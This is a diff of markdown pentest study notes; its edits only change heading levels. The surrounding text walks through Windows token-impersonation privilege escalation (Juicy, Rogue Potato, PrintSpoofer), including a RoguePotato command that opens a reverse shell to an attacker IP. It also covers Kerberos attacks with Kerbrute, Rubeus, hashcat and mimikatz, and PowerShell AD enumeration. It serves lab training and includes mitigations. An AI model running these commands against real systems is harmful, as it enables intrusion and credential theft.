@@ -2237,7 +2237,7 @@ exploit:
 > net start daclsvc
 ```
 
-#### Unquoted Service Path
+### Unquoted Service Path
 Executables in Windows can be run without using their
 extension (e.g. “whoami.exe” can be run by just typing
 “whoami”).
@@ -2897,7 +2897,7 @@ then get relayed to SMB in order to gain command execution.
 This attack works on Windows 7, 8, early versions of Windows 10,
 and their server counterparts.
 
-#### Privilege Escalation example
+### Privilege Escalation example
 
 (Note: These steps are for Windows 7)
 1.Copy the potato.exe exploit executable over to Windows.
@@ -2913,7 +2913,7 @@ and their server counterparts.
 
 ## token impersonation
 
-#### L Service Accounts
+### L Service Accounts
 We briefly talked about service accounts at the start of the
 course.
 Service accounts can be given special privileges in order for them
@@ -2922,14 +2922,14 @@ Unfortunately, multiple problems have been found with service
 accounts, making them easier to escalate privileges with.
 
 
-#### L Rotten Potato
+### L Rotten Potato
 The original Rotten Potato exploit was identified in 2016.
 Service accounts could intercept a SYSTEM ticket and use it
 to impersonate the SYSTEM user.
 This was possible because service accounts usually have the
 “SeImpersonatePrivilege” privilege enabled.
 
-#### SeImpersonate and or SeAssignPrimaryToken
+### SeImpersonate and or SeAssignPrimaryToken
 Service accounts are generally configured with these two
 privileges.
 They allow the account to impersonate the access tokens of
@@ -2937,14 +2937,14 @@ other users (including the SYSTEM user).
 Any user with these privileges can run the token
 impersonation exploits in this lecture.
 
-#### L plus E Juicy Potato
+### L plus E Juicy Potato
 Rotten Potato was quite a limited exploit.
 Juicy Potato works in the same way as Rotten Potato,
 but the authors did extensive research and found many
 more ways to exploit.
 https://github.com/ohpe/juicy-potato
 
-#### Privilege Escalation example
+### Privilege Escalation example
 
 (Note: These steps are for Windows 7)
 1.Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to
@@ -2976,7 +2976,7 @@ juicypotato-old-story-welcome-roguepotato/
 Compiled Exploit:
 https://github.com/antonioCoco/RoguePotato/releases
 
-#### Privilege Escalation example
+### Privilege Escalation example
 
 1.Copy PSExec64.exe and the RoguePotato.exe exploit executable
 over to Windows.
@@ -2999,13 +2999,13 @@ SYSTEM privileges (192.168.1.11 is the Kali IP):
 > C:\PrivEsc\RoguePotato.exe -r 192.168.1.11 –l 9999 -e "C:\PrivEsc\reverse.exe"
 ```
 
-#### E PrintSpoofer
+### E PrintSpoofer
 PrintSpoofer is an exploit that targets the Print Spooler
 service.
 GitHub: https://github.com/itm4n/PrintSpoofer
 Blog: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
 
-#### Privilege Escalation example
+### Privilege Escalation example
 
 obs: this exploit requires that visual c++ distributable is installed so transfer and installed for example "vc_redist.x64.exe installer
 
@@ -3034,7 +3034,7 @@ internal port on Windows.
 We can do this using a program called plink.exe (from the
 makers of PuTTY).
 
-#### plink exe
+### plink exe
 The general format of a port forwarding command using
 plink.exe:
 ```
@@ -3044,7 +3044,7 @@ Note that the <target-IP> is usually local (e.g. 127.0.0.1).
 plink.exe requires you to SSH to Kali, and then uses the SSH
 tunnel to forward ports.
 
-#### Privilege Escalation example
+### Privilege Escalation example
 1.First, test that we can still login remotely via winexe:
 ```
 # winexe -U 'admin%password123' //192.168.1.22 cmd.exe
@@ -3072,7 +3072,7 @@ and execute it to get a shell via the port forward:
 
 ### Privilege Escalation Strategy
 
-#### L Enumeration
+### L Enumeration
 1. Check your user (whoami) and groups (net user <username>)
 2. Run winPEAS with fast, searchfast, and cmd options.
 3. Run Seatbelt & other scripts as well!
@@ -3122,7 +3122,7 @@ completed within a timeframe. Keep searching!
 
 ## getsystem Named Pipes and Token Duplication
 
-#### L Access Tokens
+### L Access Tokens
 Access Tokens are special objects in Windows which store a user’s
 identity and privileges.
 Primary Access Token – Created when the user logs in, bound to the
@@ -3132,7 +3132,7 @@ Impersonation Access Token – Created when a process or thread needs
 to temporarily run with the security context of another user.
 
 
-#### L Token Duplication
+### L Token Duplication
 Windows allows processes/threads to duplicate their access
 tokens.
 An impersonation access token can be duplicated into a
@@ -3141,7 +3141,7 @@ If we can inject into a process, we can use this functionality
 to duplicate the access token of the process, and spawn a
 separate process with the same privileges.
 
-#### L Named Pipes
+### L Named Pipes
 You may be already familiar with the concept of a “pipe” in Windows & Linux:
 ```
 > systeminfo | findstr Windows
@@ -3153,7 +3153,7 @@ The process which created the named pipe can impersonate the security context
 of a process which connects to the named pipe.
 
 
-#### L getsystem
+### L getsystem
 The “getsystem” command in Metasploit’s Meterpreter
 shell has an almost mythical status.
 By running this simple command, our privileges are
@@ -3169,7 +3169,7 @@ Three files are worth looking through: elevate.c,
 namedpipe.c, and tokendup.c
 There are 3 techniques getsystem can use to “get system”.
 
-#### Named Pipe Impersonation InMemory and or Admin
+### Named Pipe Impersonation InMemory and or Admin
 Creates a named pipe controlled by Meterpreter.
 Creates a service (running as SYSTEM) which runs a command
 that interacts directly with the named pipe.
@@ -3178,14 +3178,14 @@ impersonation access token (with the SYSTEM security context).
 The access token is then assigned to all subsequent Meterpreter
 threads, meaning they run with SYSTEM privileges.
 
-#### Named Pipe Impersonation Dropper and or Admin
+### Named Pipe Impersonation Dropper and or Admin
 Very similar to Named Pipe Impersonation (In
 Memory/Admin).
 Only difference is a DLL is written to disk, and a service
 created which runs the DLL as SYSTEM.
 The DLL connects to the named pipe.
 
-#### Token Duplication In Memory and or Admin
+### Token Duplication In Memory and or Admin
 This technique requires the “SeDebugPrivilege”.
 It finds a service running as SYSTEM which it injects a DLL into.
 The DLL duplicates the access token of the service and assigns it to
@@ -3194,7 +3194,7 @@ Currently this only works on x86 architectures.
 This is the only technique that does not have to create a service, and
 operates entirely in memory.
 
-#### Summary
+### Summary
 getsystem was designed as a tool to escalate privileges from a local
 admin to SYSTEM.
 The Named Pipe techniques require local admin permissions.
@@ -3211,7 +3211,7 @@ Some of these abilities can be used to escalate our overall
 privileges to that of SYSTEM.
 Highly detailed paper: https://github.com/hatRiot/token-priv
 
-#### Listing our Privileges
+### Listing our Privileges
 The whoami command can be used to list our user’s
 privileges, using the /priv option:
 ```
@@ -3220,7 +3220,7 @@ privileges, using the /priv option:
 Note that “disabled” in the state column is irrelevant
 here. If the privilege is listed, your user has it.
 
-#### SeImpersonatePrivilege
+### SeImpersonatePrivilege
 The SeImpersonatePrivilege grants the ability to impersonate
 any access tokens which it can obtain.
 If an access token from a SYSTEM process can be obtained,
@@ -3228,20 +3228,20 @@ then a new process can be spawned using that token.
 The Juicy Potato exploit in a previous section abuses this
 ability.
 
-#### SeAssignPrimaryPrivilege
+### SeAssignPrimaryPrivilege
 The SeAssignPrimaryPrivilege is similar to
 SeImpersonatePrivilege.
 It enables a user to assign an access token to a new process.
 Again, this can be exploited with the Juicy Potato exploit.
 
-#### SeBackupPrivilege
+### SeBackupPrivilege
 The SeBackupPrivilege grants read access to all objects
 on the system, regardless of their ACL.
 Using this privilege, a user could gain access to sensitive
 files, or extract hashes from the registry which could
 then be cracked or used in a pass-the-hash attack.
 
-#### SeRestorePrivilege
+### SeRestorePrivilege
 The SeRestorePrivilege grants write access to all objects on
 the system, regardless of their ACL.
 There are a multitude of ways to abuse this privilege:
@@ -3249,14 +3249,14 @@ There are a multitude of ways to abuse this privilege:
 • Overwrite DLLs used by SYSTEM processes
 • Modify registry settings.
 
-#### SeTakeOwnershipPrivilege
+### SeTakeOwnershipPrivilege
 The SeTakeOwnershipPrivilege lets the user take ownership
 over an object (the WRITE_OWNER permission).
 Once you own an object, you can modify its ACL and grant
 yourself write access.
 The same methods used with SeRestorePrivilege then apply.
 
-#### Other Privileges More Advanced
+### Other Privileges More Advanced
 • SeTcbPrivilege
   
 • SeCreateTokenPrivilege
@@ -3276,7 +3276,7 @@ https://tryhackme.com/room/windowsprivesc20
 
 ## Harvesting Passwords from Usual Spots
 
-#### Unattended Windows Installations
+### Unattended Windows Installations
 
 When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
 
@@ -6073,7 +6073,7 @@ of Privilege' --exploits-only | less
 -------------------------------------------------------------------------------------
 ## Attacking Kerberos
 
-### Introduction 
+## Introduction 
 This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we'll cover the following:
 
 *    Initial enumeration using tools like Kerbrute and Rubeus
@@ -6106,17 +6106,17 @@ Kerberos is the default authentication service for Microsoft Windows domains. It
 *    Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
 *    Privilege Attribute Certificate (PAC) - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.
 
-#### AS-REQ w/ Pre-Authentication In Detail - 
+### AS-REQ with Pre-Authentication In Detail  
 
 The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.
 
-#### Ticket Granting Ticket Contents -
+### Ticket Granting Ticket Contents -
 
 In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.
 
 ![image](https://user-images.githubusercontent.com/24814781/199109981-2d0223c6-649b-4a41-bd5a-66952d970e4f.png)
 
-#### Service Ticket Contents - 
+### Service Ticket Contents 
 
 To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.
 
@@ -6125,7 +6125,7 @@ To understand how Kerberos authentication works you first need to understand wha
 
 ![image](https://user-images.githubusercontent.com/24814781/199110068-ad6696d9-6f27-487f-abbc-c6ec3dcb3677.png)
 
-#### Kerberos Authentication Overview 
+### Kerberos Authentication Overview 
 
 ![image](https://user-images.githubusercontent.com/24814781/199110112-0254ce8b-ff10-4a07-aa90-be71530b3370.png)
 
@@ -6141,11 +6141,11 @@ AP-REQ - 5.) The client requests the service and sends the valid session key to 
 
 AP-REP - 6.) The service grants access
 
-#### Kerberos Tickets Overview - 
+### Kerberos Tickets Overview - 
 
 The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.
 
-#### Attack Privilege Requirements -
+### Attack Privilege Requirements -
 
 *    Kerbrute Enumeration - No domain access required 
 *    Pass the Ticket - Access as a user to the domain required
@@ -6161,13 +6161,13 @@ Kerbrute is a popular enumeration tool used to brute-force and enumerate valid a
 
 You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you
 
-#### Abusing Pre-Authentication Overview -
+### Abusing Pre-Authentication Overview -
 
 By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.
 
 ![image](https://user-images.githubusercontent.com/24814781/199111629-82c48cc8-ceae-4136-9f27-7975dbb253bc.png)
 
-#### Kerbrute Installation - 
+### Kerbrute Installation - 
 
 1.) Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases
 
@@ -6175,7 +6175,7 @@ By brute-forcing Kerberos pre-authentication, you do not trigger the account fai
 
 3.) chmod +x kerbrute - make kerbrute executable
 
-#### Enumerating Users w/ Kerbrute -
+### Enumerating Users w/ Kerbrute -
 
 Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.
 
@@ -6186,7 +6186,7 @@ kerbrute userenum --dc Domain.local -d Domain.local <text file with usernames>
 
 ![image](https://user-images.githubusercontent.com/24814781/199111916-645e5732-109a-442f-a3c0-8ef47eaa6a8e.png)
 
-### Harvesting and Brute-Forcing Tickets with Rubeus
+## Harvesting and Brute-Forcing Tickets with Rubeus
 
 Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.
 
@@ -6200,7 +6200,7 @@ Rubeus is already compiled and on the target machine.
 
 ![image](https://user-images.githubusercontent.com/24814781/199325834-5e3198de-6218-40cc-a346-6a0e6a28dec1.png)
 
-#### Harvesting Tickets with Rubeus
+### Harvesting Tickets with Rubeus
 
 Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.
 
@@ -6212,7 +6212,7 @@ This command tells Rubeus to harvest for TGTs every 30 seconds
 
 ![image](https://user-images.githubusercontent.com/24814781/199325906-6eb43d7b-7977-4244-af81-155bd629ddab.png)
 
-#### Brute-Forcing and Password-Spraying with Rubeus
+### Brute-Forcing and Password-Spraying with Rubeus
 
 Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.
 
@@ -6244,9 +6244,9 @@ I have already taken the time to put Rubeus on the machine for you, it is locate
 
 ![image](https://user-images.githubusercontent.com/24814781/199329282-5e42b31f-becd-44a4-8aad-e19afdffd486.png)
 
-#### Method 1 Rubeus
+### Method 1 Rubeus
 
-### Kerberoasting with Rubeus
+## Kerberoasting with Rubeus
 
 ```
 Rubeus.exe kerberoast 
@@ -6262,9 +6262,9 @@ hashcat -m 13100 -a 0 hash.txt Pass.txt
 ```
 now crack that hash
 
-#### Method 2 Impacket
+### Method 2 Impacket
 
-##### Impacket Installation 
+#### Impacket Installation 
 
 Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20
 
@@ -6277,7 +6277,7 @@ Impacket releases have been unstable since 0.9.20 I suggest getting an installat
 4.) pip install . - this will install all needed dependencies
 
 
-### Kerberoasting with Impacket
+## Kerberoasting with Impacket
 
 1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located (or just just GetUserSPNs.py directly depending how you installed it)
 
@@ -6289,16 +6289,17 @@ Impacket releases have been unstable since 0.9.20 I suggest getting an installat
 
 After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.
 
-#### Mitigation - Defending the Forest
+### Mitigation - Defending the Forest
+  
 ![image](https://user-images.githubusercontent.com/24814781/199331831-8237e1d8-b705-4245-9e26-0cd5f4cd0075.png)
 
-#### Kerberoasting Mitigation -
+### Kerberoasting Mitigation -
 
 *     Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
 *     Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.
 
 
-### AS-REP Roasting with Rubeus
+## AS-REP Roasting with Rubeus
 
 Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.
 
@@ -6333,7 +6334,7 @@ Use the same wordlist that you downloaded in task 4
 
 ![image](https://user-images.githubusercontent.com/24814781/199628429-97047147-ff6c-4f0c-9086-55ff168dcf6d.png)
 
-#### AS-REP Roasting Mitigations - 
+### AS-REP Roasting Mitigations - 
 
 *    Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective*
 *    Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
@@ -6345,13 +6346,13 @@ This will only be an overview of how the pass the ticket attacks work as THM doe
 
 You can run this attack on the given machine however you will be escalating from a domain admin to a domain admin because of the way the domain controller is set up.
 
-#### Pass the Ticket Overview 
+### Pass the Ticket Overview 
 
 Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.
 
 ![image](https://user-images.githubusercontent.com/24814781/199795002-12df778f-c073-4dc1-b394-38d8179d51fc.png)
 
-Prepare Mimikatz & Dump Tickets - 
+### Prepare Mimikatz and Dump Tickets 
 
 You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.
 
@@ -6371,7 +6372,7 @@ At this step you can also use the base 64 encoded tickets from Rubeus that we ha
 
 When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.
 
-#### final Pass the Ticket with Mimikatz
+### final Pass the Ticket with Mimikatz
 
 Now that we have our ticket ready we can now perform a pass the ticket attack to gain domain admin privileges.
 
@@ -6391,7 +6392,7 @@ We will not be using mimikatz for the rest of the attack.
 
 Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.
 
-#### Pass the Ticket Mitigation
+### Pass the Ticket Mitigation
 
 Let's talk blue team and how to mitigate these types of attacks. 
 
@@ -6500,7 +6501,7 @@ Common verbs to include
 
 Now that we've understood how cmdlets works - let's explore how to use them! The main thing to remember here is that Get-Command and Get-Help are your best friends!
 
-#### Using Get-Help
+### Using Get-Help
 
 Get-Help displays information about a cmdlet. To get help about a particular command, run the following.
 ```
@@ -6510,7 +6511,7 @@ You can also understand how exactly to use the command by passing in the -exampl
 
 ![image](https://user-images.githubusercontent.com/24814781/184435826-117b6f0d-3e55-4966-9593-2f06b4319014.png)
 
-#### Using Get-Command
+### Using Get-Command
 
 Get-Command gets all the cmdlets installed on the current device. The great thing about this cmdlet is that it allows for pattern matching like the following.
 ```
@@ -6526,7 +6527,7 @@ Running the Get-Command New-* to view all the cmdlets for the verb new displays 
 ![image](https://user-images.githubusercontent.com/24814781/184435903-c3dde93d-432c-4a75-95e9-cebb0a0ca20d.png)
 
 
-#### Object Manipulation
+### Object Manipulation
 
 In the previous task, we saw how the output of every cmdlet is an object. If we want to actually manipulate the output, we need to figure out a few things.
 
@@ -6547,7 +6548,7 @@ Get-Command | Get-Member -MemberType Method
 From the above flag in the command, you can see that you can also select between methods and properties.
 
 
-#### Creating Objects From Previous cmdlets
+### Creating Objects From Previous cmdlets
 
 One way of manipulating objects is pulling out the properties from the output of a cmdlet and creating a new object. This is done using the Select-Object cmdlet.
 
@@ -6565,7 +6566,7 @@ unique - shows the unique objects
 
 skip - skips x objects
 
-#### Filtering Objects
+### Filtering Objects
 
 When retrieving output objects, you may want to select objects that match a very specific value. You can do this using the Where-Object to filter based on the value of properties.
 
@@ -6597,7 +6598,7 @@ Here's an example of checking the stopped processes:
 ![image](https://user-images.githubusercontent.com/24814781/184436240-b3d76a83-3b38-4d76-964d-8e789ad44e43.png)
 
 
-#### Sort Object
+### Sort Object
 
 When a cmdlet outputs a lot of information, you may need to sort it to extract the information more efficiently. You do this by pipe lining the output of a cmdlet to the Sort-Object cmdlet.
 
@@ -6609,7 +6610,7 @@ Here's an example of sorting the list of directories.
 
 ![image](https://user-images.githubusercontent.com/24814781/184436288-d6cf9435-faeb-455c-a19c-36985dfa999f.png)
 
-#### Introduction to Offensive Powershell
+### Introduction to Offensive Powershell
 
 Well we have all this information now how can we apply it to attacking a windows network? We can utilize offensive powershell to enumerate and attack Windows and Windows Active Directory.
 
@@ -6628,7 +6629,7 @@ Import-Module Module
 ```
 Note: . .\ will only work with powershell script files. All other modules will need to be imported with Import-Module for example ActiveDirectory can only be imported with Import-Module.
 
-#### Get-ADDomain
+### Get-ADDomain
 
 Get-ADDomain is a commandlet that pulls a large majority of the information about the Domain you’re attacking. It can list all of the Domain Controllers for a given environment, tell you the NetBIOS Domain name, the FQDN (Fully Qualified Domain name) and much more. Using the Select-Object command, we can filter out some of the unnecessary objects that may be displayed (like COntainers, Group Policy Objects, and much more)
 ```
@@ -6636,7 +6637,7 @@ Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster
 ```
 ![image](https://user-images.githubusercontent.com/24814781/184438202-37ba4f39-8315-4fa1-8cd0-ac7320a82ae7.png)
 
-#### Get-ADForest
+### Get-ADForest
 
 Get-ADForest is another commandlet that pulls all the Domains within a Forest and lists them out to the user. This may be useful if a bidirectional trust is setup, it may allow you to gain a foothold in another domain on the LAN. Just like Get-ADDomain, there is a lot of output, so we will be using Select-Object to trim the output down.
 ```
@@ -6645,7 +6646,7 @@ Get-ADForest | Select-Object Domains
 ![image](https://user-images.githubusercontent.com/24814781/184438332-af74d157-6002-4ae0-a3c3-235eaa52c849.png)
 
 
-#### Get-ADTrust 
+### Get-ADTrust 
 
 Get-ADTrust is the last built in Powershell commandlet that we will be discussing, after this, we will move over to Powerview. Get-ADTrust provides a ton of information about the Trusts within the AD Domain. It can tell you if it’s a one way or bidirectional trust, who the source is, who the target is, and much more. One required field is -Filter, this is required in the event that you want to filter on a specific Domain/Trust, if you do not (like in most circumstances), you can simply provide a * to wildcard the results.
 ```
